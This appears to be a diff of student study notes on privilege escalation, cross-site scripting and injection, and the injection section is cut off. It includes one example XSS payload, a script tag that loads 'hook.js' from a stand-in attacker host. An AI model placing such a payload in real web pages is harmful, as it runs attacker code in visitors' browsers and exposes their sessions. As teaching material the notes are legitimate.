@@ -1,37 +1,35 @@
 # Privilege escalation
-* Gains full access to a system
+- The attacker gains full access to a system
+   - Usally exploits a vulnerability  
+   - Malware can catch any privilage escalation 
 
-* exploits a vulnerability 
-
-* Ussally when one user can access another user 
-
-* Malware can catch any privilage escalation 
-
-> CVE-2020-1530 Windows Remote Access Elevation of Privelage vulnerability august 20, 2020
+- **Example** - CVE-2020-1530 Windows Remote Access Elevation of Privelage vulnerability august 20, 2020
 
 # Cross-site scripting
-* Also known as **XSS** 
+- A malicious script hosted on the attacker's site or coded in a link injection onto a trusted site designed to compromise clients browsing the trusted site.
+  - Also known as XSS
+  - Orginally associated with a browser security flaws; Information from one site to another could be shared
 
-* Orginally associated with a browser security flaws; Information from one site to another could be shared
+- Process of an XSS attack
+1. The attacker indentifies an input validation vulnerability in a trusted site
+2. The attacker crafts a URL to perform a code injection against the trusted site. 
+3. When the user clicks the link, the trusted site returns a page containing the malicious code injected by the attacker
 
-* Common web based application developement errors
+- **Example** - Check out this amazing <a href="https://trusted.foo">website</a><script src="https://badsite.foo/hook.js"></script>.
 
-* Malware used in javascript
+- **Non-persistant XSS attack**
+    - seach box is a common source 
+    - Sent through link that activates payload 
+    - Hacker can get session id and more information
 
-* Non-persistant XSS attack 
+- **Persistent XSS attack** 
 
-> seach box is a common source 
-> Sent through link that activates payload 
-> Hacker can get session id and more information
+    - Includes a malicious payload 
+    - The malicious message has the virus and everyone gets it when the message is read 
+    - There isnt someone targeted; different from non-persistant where the person can be targeted 
+    - Can spread easy through social media
 
-* Persistent XSS attack 
-
-> Includes a malicious payload 
-> The malicious message has the virus and everyone gets it when the message is read 
-> There isnt someone targeted; different from non-persistant where the person can be targeted 
-> Can spread easy through social media
-
-> Example- Subaru website gave you a log in token when you entered the website. The log in token never expired, therefore if someone got ahold of this token, theu could log in. 
+    - **Example** - Subaru website gave you a log in token when you entered the website. The log in token never expired, therefore if someone got ahold of this token, theu could log in. 
 
 # Injection
 * Adding your own information in a data stream 
